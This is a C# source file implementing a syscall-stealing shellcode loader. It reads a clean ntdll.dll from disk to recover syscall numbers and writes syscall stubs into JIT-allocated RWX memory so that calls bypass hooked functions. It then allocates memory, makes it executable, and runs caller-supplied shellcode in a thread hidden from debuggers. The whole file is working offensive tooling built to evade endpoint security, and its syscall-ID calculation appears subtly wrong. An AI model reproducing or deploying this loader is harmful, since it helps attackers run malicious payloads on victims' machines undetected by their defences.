using System;
using System.Runtime;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Collections;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.IO;
using System.Runtime.CompilerServices;
using System.Reflection;

public class TripleS {
    
    public bool IsGateReady = false;

    public bool IsSyscallReady = false;

    public IntPtr GatePositionAddress = IntPtr.Zero;

    public Dictionary<UInt64, SyscallTableEntry> SyscallTableEntries = new Dictionary<UInt64, SyscallTableEntry>();

    public IntPtr SyscallExecuterAddress = IntPtr.Zero;

    public struct SyscallTableEntry {
        public string Name;
        public UInt64 Hash;
        public Int16 SyscallID;
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private static UInt32 JITMeDaddy() {
        return new UInt32();
    }

    public static UInt64 GetFunctionDJB2Hash(string FunctionName) {
        if (string.IsNullOrEmpty(FunctionName))
            return 0;

        UInt64 hash = 0x7734773477347734;
        foreach (char c in FunctionName)
            hash = ((hash << 0x5) + hash) + (byte)c;

        return hash;
    }

    // managed to unmanaged
    private static unsafe void Copy(byte[] source, int startIndex, IntPtr destination, int length) {
        if (source == null || source.Length == 0 || destination == IntPtr.Zero || length == 0) {
            throw new ArgumentNullException("Exception : One or more of the arguments are zero/null!");
        }
        if ((startIndex + length) > source.Length) {
            throw new ArgumentOutOfRangeException("Exception : startIndex and length exceeds the size of source bytes!");
        }
        int targetIndex = 0;
        byte* TargetByte = (byte*)(destination.ToPointer());
        for (int sourceIndex = startIndex; sourceIndex < (startIndex + length); sourceIndex++) {
            *(TargetByte + targetIndex) = source[sourceIndex];
            targetIndex++;
        }
    }

    // unmanaged to managed
    private static unsafe void Copy(IntPtr source, ref byte[] destination, int startIndex, int length) {
        if (source == IntPtr.Zero || destination == null || destination.Length == 0 || length == 0) {
            throw new ArgumentNullException("Exception : One or more of the arguments are zero/null!");
        }
        if ((startIndex + length) > destination.Length) {
            throw new ArgumentOutOfRangeException("Exception : startIndex and length exceeds the size of destination bytes!");
        }
        byte* TargetByte = (byte*)(source.ToPointer());
        int sourceIndex = 0;
        for (int targetIndex = startIndex; targetIndex < (startIndex + length); targetIndex++) {
            destination[targetIndex] = *(TargetByte + sourceIndex);
            sourceIndex++;
        }
    }

    private static byte[] Combine(byte[] a1, byte[] a2, byte[] a3)
    {
        byte[] ret = new byte[a1.Length + a2.Length + a3.Length];
        Array.Copy(a1, 0, ret, 0, a1.Length);
        Array.Copy(a2, 0, ret, a1.Length, a2.Length);
        Array.Copy(a3, 0, ret, a1.Length + a2.Length, a3.Length);
        return ret;
    }

    public bool Gate(UInt64 Hash) {
        if (!this.IsGateReady || GatePositionAddress == IntPtr.Zero) {
            bool result = this.PrepareGateSpace();
            if (!result) 
                return false;
        }

        if (!this.SyscallTableEntries.ContainsKey(Hash))
            return false;
        Int16 SyscallID = this.SyscallTableEntries[Hash].SyscallID;

        byte[] stub = new byte[0];
        if (this.SyscallExecuterAddress != IntPtr.Zero) {
            byte[] jumpAddr = (IntPtr.Size == 4 ? BitConverter.GetBytes((Int32)SyscallExecuterAddress) : BitConverter.GetBytes((Int64)SyscallExecuterAddress));
            byte[] jumpStub = Combine(new byte[] { Convert.ToByte("49", 16), Convert.ToByte("BB", 16) }, jumpAddr, new byte[] { Convert.ToByte("41", 16), Convert.ToByte("FF", 16), Convert.ToByte("E3", 16) }); // move r11, <jump addr>; jmp r11;

            stub = new byte[8] {
                Convert.ToByte("4C", 16), Convert.ToByte("8B", 16), Convert.ToByte("D1", 16), // move r10, rcx
                Convert.ToByte("B8", 16), (byte)SyscallID, (byte)(SyscallID >> 8), Convert.ToByte("00", 16), Convert.ToByte("00", 16), // mov eax, <syscall id>
            };
            stub = stub.Concat(jumpStub).ToArray();
        }else {
            // this one will acted like a fail safe if NtTestAlert is hooked
            stub = new byte[24] {
                Convert.ToByte("4C", 16), Convert.ToByte("8B", 16), Convert.ToByte("D1", 16),
                Convert.ToByte("B8", 16), (byte)SyscallID, (byte)(SyscallID >> 8), Convert.ToByte("00", 16), Convert.ToByte("00", 16),
                Convert.ToByte("F6", 16), Convert.ToByte("04", 16), Convert.ToByte("25", 16), Convert.ToByte("08", 16), Convert.ToByte("03", 16), Convert.ToByte("FE", 16), Convert.ToByte("7F", 16), Convert.ToByte("01", 16),
                Convert.ToByte("75", 16), Convert.ToByte("03", 16),
                Convert.ToByte("0F", 16), Convert.ToByte("05", 16),
                Convert.ToByte("C3", 16),
                Convert.ToByte("CD", 16), Convert.ToByte("2E", 16),
                Convert.ToByte("C3", 16)
            };
        }

        Copy(stub, 0, this.GatePositionAddress, stub.Length);
        Array.Clear(stub, 0, stub.Length); // clean up
        return true;
    }

    public bool PrepareGateSpace() {
        // Find and JIT the method to generate RWX space
        MethodInfo method = typeof(TripleS).GetMethod("JITMeDaddy", BindingFlags.Static | BindingFlags.NonPublic);
        if (method == null) {
            Console.WriteLine("Unable to find the method");
            return false;
        }
        RuntimeHelpers.PrepareMethod(method.MethodHandle);

        IntPtr pMethod = method.MethodHandle.GetFunctionPointer();

        this.GatePositionAddress = pMethod;
        this.IsGateReady = true;
        return true;
    }

    public void CollectAllSyscalls() {
        string NTDLLFullPath = String.Empty;
        try{ 
            NTDLLFullPath = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => "ntdll.dll".Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().FileName); 
        }catch{
            Console.WriteLine("Failed to get NTDLL path.");
            return;
        }
        
        byte[] NTDLLBytes = File.ReadAllBytes(NTDLLFullPath);
        IntPtr PERegionSize = (IntPtr)BitConverter.ToInt32(NTDLLBytes, (BitConverter.ToInt32(NTDLLBytes, (int)0x3C) + 0x18) + 56);
        IntPtr ModuleBase = Marshal.AllocHGlobal(PERegionSize);
        
        // copy headers
        int SizeOfHeaders = BitConverter.ToInt32(NTDLLBytes, (BitConverter.ToInt32(NTDLLBytes, (int)0x3C) + 0x18) + 60);
        Marshal.Copy(NTDLLBytes, 0, ModuleBase, SizeOfHeaders);

        //Copy Sections
        IntPtr SectionHeaderBaseAddr = ModuleBase + Marshal.ReadInt32((IntPtr)(ModuleBase + 0x3C)) + 0x18 + Marshal.ReadInt16((IntPtr)(ModuleBase + Marshal.ReadInt32((IntPtr)(ModuleBase + 0x3C)) + 20));
        Int16 NumberOfSections = Marshal.ReadInt16(ModuleBase + Marshal.ReadInt32((IntPtr)(ModuleBase + 0x3C)) + 6);
        for (int i = 0; i < NumberOfSections; i++) {
            IntPtr CurrentSectionHeaderAddr = SectionHeaderBaseAddr + (i * 40);
            Int32 CurrentSectionSize = Marshal.ReadInt32(CurrentSectionHeaderAddr + 8);
            Int32 CurrentSectionOffset = Marshal.ReadInt32(CurrentSectionHeaderAddr + 20);
            Int32 CurrentSectionRVA = Marshal.ReadInt32(CurrentSectionHeaderAddr + 12);
            Marshal.Copy(NTDLLBytes, CurrentSectionOffset, (IntPtr)(ModuleBase.ToInt64() + CurrentSectionRVA), CurrentSectionSize);
        }
        
        try {
            // Traverse the PE header in memory
            Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
            Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
            Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
            Int64 pExport = 0;
            if (Magic == 0x010b) {
                pExport = OptHeader + 0x60;
            }else {
                pExport = OptHeader + 0x70;
            }

            // Read -> IMAGE_EXPORT_DIRECTORY
            Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
            Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
            Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
            Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
            Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
            Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

            // Loop the array of export name RVA's
            for (int i = 0; i < NumberOfNames; i++) {
                string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                if (!FunctionName.StartsWith("Nt") || FunctionName.StartsWith("Ntdll")) {
                    continue; // skip Non-Nt functions
                }
                Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                IntPtr FunctionAddress = (IntPtr)((Int64)ModuleBase + FunctionRVA);

                // copy function opcode
                byte[] FunctionOpcode = new byte[24];
                Copy(FunctionAddress, ref FunctionOpcode, 0, 24);
                SyscallTableEntry table = new SyscallTableEntry();
                table.Name = FunctionName;
                table.Hash = GetFunctionDJB2Hash(FunctionName);
                table.SyscallID = (Int16)(((byte)FunctionOpcode[5] << 4) | (byte)FunctionOpcode[4]);
                SyscallTableEntries.Add(table.Hash, table);

                if (FunctionName == "NtTestAlert") {
                    IntPtr SearchStartAddress = (IntPtr)((Int64)(Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => "ntdll.dll".Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress) + FunctionRVA); // need to get address from the real ntdll
                    byte[] SearchTarget = { Convert.ToByte("F6", 16), Convert.ToByte("04", 16), Convert.ToByte("25", 16), Convert.ToByte("08", 16), Convert.ToByte("03", 16), Convert.ToByte("FE", 16), Convert.ToByte("7F", 16), Convert.ToByte("01", 16), Convert.ToByte("75", 16), Convert.ToByte("03", 16), Convert.ToByte("0F", 16), Convert.ToByte("05", 16), Convert.ToByte("C3", 16), Convert.ToByte("CD", 16), Convert.ToByte("2E", 16), Convert.ToByte("C3", 16) }; // this way, we can still support x86 (legacy)
                    for (int z = 0; z < 32; z++) {
                        byte[] CurrentSearch = new byte[16];
                        Copy((SearchStartAddress + z), ref CurrentSearch, 0, 16);
                        if (CurrentSearch.SequenceEqual(SearchTarget)) {
                            SyscallExecuterAddress = SearchStartAddress + z;
                        }
                    }
                }
            }
            this.IsSyscallReady = true;
            Marshal.FreeHGlobal(ModuleBase);
        }
        catch {
        }
    }
}

public class UsageExample {
    [Flags]
    public enum AllocationType : ulong
    {
        Commit = 0x1000,
        Reserve = 0x2000,
        Decommit = 0x4000,
        Release = 0x8000,
        Reset = 0x80000,
        Physical = 0x400000,
        TopDown = 0x100000,
        WriteWatch = 0x200000,
        LargePages = 0x20000000
    };

    [Flags]
    public enum ACCESS_MASK : uint
    {
        DELETE = 0x00010000,
        READ_CONTROL = 0x00020000,
        WRITE_DAC = 0x00040000,
        WRITE_OWNER = 0x00080000,
        SYNCHRONIZE = 0x00100000,
        STANDARD_RIGHTS_REQUIRED = 0x000F0000,
        STANDARD_RIGHTS_READ = 0x00020000,
        STANDARD_RIGHTS_WRITE = 0x00020000,
        STANDARD_RIGHTS_EXECUTE = 0x00020000,
        STANDARD_RIGHTS_ALL = 0x001F0000,
        SPECIFIC_RIGHTS_ALL = 0x0000FFF,
        ACCESS_SYSTEM_SECURITY = 0x01000000,
        MAXIMUM_ALLOWED = 0x02000000,
        GENERIC_READ = 0x80000000,
        GENERIC_WRITE = 0x40000000,
        GENERIC_EXECUTE = 0x20000000,
        GENERIC_ALL = 0x10000000,
        DESKTOP_READOBJECTS = 0x00000001,
        DESKTOP_CREATEWINDOW = 0x00000002,
        DESKTOP_CREATEMENU = 0x00000004,
        DESKTOP_HOOKCONTROL = 0x00000008,
        DESKTOP_JOURNALRECORD = 0x00000010,
        DESKTOP_JOURNALPLAYBACK = 0x00000020,
        DESKTOP_ENUMERATE = 0x00000040,
        DESKTOP_WRITEOBJECTS = 0x00000080,
        DESKTOP_SWITCHDESKTOP = 0x00000100,
        WINSTA_ENUMDESKTOPS = 0x00000001,
        WINSTA_READATTRIBUTES = 0x00000002,
        WINSTA_ACCESSCLIPBOARD = 0x00000004,
        WINSTA_CREATEDESKTOP = 0x00000008,
        WINSTA_WRITEATTRIBUTES = 0x00000010,
        WINSTA_ACCESSGLOBALATOMS = 0x00000020,
        WINSTA_EXITWINDOWS = 0x00000040,
        WINSTA_ENUMERATE = 0x00000100,
        WINSTA_READSCREEN = 0x00000200,
        WINSTA_ALL_ACCESS = 0x0000037F,

        SECTION_ALL_ACCESS = 0x10000000,
        SECTION_QUERY = 0x0001,
        SECTION_MAP_WRITE = 0x0002,
        SECTION_MAP_READ = 0x0004,
        SECTION_MAP_EXECUTE = 0x0008,
        SECTION_EXTEND_SIZE = 0x0010
    };

    [Flags]
    public enum ThreadCreateFlags : ulong {
        THREAD_CREATE_FLAGS_NONE = 0x00000000,
        THREAD_CREATE_FLAGS_CREATE_SUSPENDED =  0x00000001,
        THREAD_CREATE_FLAGS_SKIP_THREAD_ATTACH = 0x00000002,
        THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER = 0x00000004,
        THREAD_CREATE_FLAGS_HAS_SECURITY_DESCRIPTOR = 0x00000010,
        THREAD_CREATE_FLAGS_ACCESS_CHECK_IN_TARGET = 0x00000020,
        THREAD_CREATE_FLAGS_INITIAL_THREAD = 0x00000080
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate UInt32 NTAVMDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, UInt32 AllocationType, UInt32 Protect);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate UInt32 NTCTEDelegate(
        out IntPtr threadHandle,
        ACCESS_MASK desiredAccess,
        IntPtr objectAttributes,
        IntPtr processHandle,
        IntPtr startAddress,
        IntPtr parameter,
        ThreadCreateFlags createSuspended,
        int stackZeroBits,
        int sizeOfStack,
        int maximumStackSize,
        IntPtr attributeList);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate UInt32 NTPVMDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 NewAccessProtection, ref UInt32 OldAccessProtection);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate UInt32 NTWFSODelegate(IntPtr handle, bool Alertable, long TimeOut);

    public static void Main(byte[] ShellcodeBytes) {
        // get function hashes
        UInt64 NTAVMHash = TripleS.GetFunctionDJB2Hash("NtAllocateVirtualMemory");
        UInt64 NTCTEHash = TripleS.GetFunctionDJB2Hash("NtCreateThreadEx");
        UInt64 NTPVMHash = TripleS.GetFunctionDJB2Hash("NtProtectVirtualMemory");
        UInt64 NTWFSOHash = TripleS.GetFunctionDJB2Hash("NtWaitForSingleObject");

        // initialize a new TripleS object
        TripleS syscallstealer = new TripleS();

        // prepare gate space before using the gate
        bool result = syscallstealer.PrepareGateSpace();
        if (!result) {
            Console.WriteLine("Failed to prepare gate space!");
            return;
        }

        // you can initialize the delegate any time you want after preparing the gate space
        NTAVMDelegate NTAVM = (NTAVMDelegate)Marshal.GetDelegateForFunctionPointer(syscallstealer.GatePositionAddress, typeof(NTAVMDelegate));
        NTCTEDelegate NTCTE = (NTCTEDelegate)Marshal.GetDelegateForFunctionPointer(syscallstealer.GatePositionAddress, typeof(NTCTEDelegate));
        NTPVMDelegate NTPVM = (NTPVMDelegate)Marshal.GetDelegateForFunctionPointer(syscallstealer.GatePositionAddress, typeof(NTPVMDelegate));
        NTWFSODelegate NTWFSO = (NTWFSODelegate)Marshal.GetDelegateForFunctionPointer(syscallstealer.GatePositionAddress, typeof(NTWFSODelegate));

        // collect all syscalls
        syscallstealer.CollectAllSyscalls(); // the syscall informations will be stored on the TripleS object
        if (!syscallstealer.IsSyscallReady) {
            Console.WriteLine("Failed to collect syscall!");
        }

        IntPtr ProcessHandle = new IntPtr(-1); // pseudo-handle for current process
        IntPtr ShellcodeBytesLength = new IntPtr(ShellcodeBytes.Length);
        IntPtr AllocationAddress = new IntPtr();
        IntPtr ZeroBitsThatZero = IntPtr.Zero;
        UInt32 AllocationTypeUsed = (UInt32)AllocationType.Commit | (UInt32)AllocationType.Reserve;
        Console.WriteLine("[*] Allocating memory...");
        syscallstealer.Gate(NTAVMHash); // dont forget to set the gate to your destination function ;)
        NTAVM(ProcessHandle, ref AllocationAddress, ZeroBitsThatZero, ref ShellcodeBytesLength, AllocationTypeUsed, 0x04);
        
        Console.WriteLine("[*] Copying Shellcode...");
        Marshal.Copy(ShellcodeBytes, 0, AllocationAddress, ShellcodeBytes.Length);
        
        Console.WriteLine("[*] Changing memory protection setting...");
        UInt32 newProtect = 0;
        syscallstealer.Gate(NTPVMHash);
        NTPVM(ProcessHandle, ref AllocationAddress, ref ShellcodeBytesLength, 0x20, ref newProtect);
        
        IntPtr threadHandle = new IntPtr(0);
        ACCESS_MASK desiredAccess = ACCESS_MASK.SPECIFIC_RIGHTS_ALL | ACCESS_MASK.STANDARD_RIGHTS_ALL; // logical OR the access rights together
        IntPtr pObjectAttributes = new IntPtr(0);
        IntPtr lpParameter = new IntPtr(0);
        ThreadCreateFlags createFlags = ThreadCreateFlags.THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER;
        int stackZeroBits = 0;
        int sizeOfStackCommit = 0xFFFF;
        int sizeOfStackReserve = 0xFFFF;
        IntPtr pBytesBuffer = new IntPtr(0);
        // create new thread
        Console.WriteLine("[*] Creating new thread to execute the Shellcode...");
        syscallstealer.Gate(NTCTEHash);
        NTCTE(out threadHandle, desiredAccess, pObjectAttributes, ProcessHandle, AllocationAddress, lpParameter, createFlags, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, pBytesBuffer);
        
        Console.WriteLine("[+] Thread created with handle {0}! Sh3llc0d3 executed!", threadHandle.ToString("X4"));

        syscallstealer.Gate(NTWFSOHash);
        NTWFSO(threadHandle, false, 0);
    }
}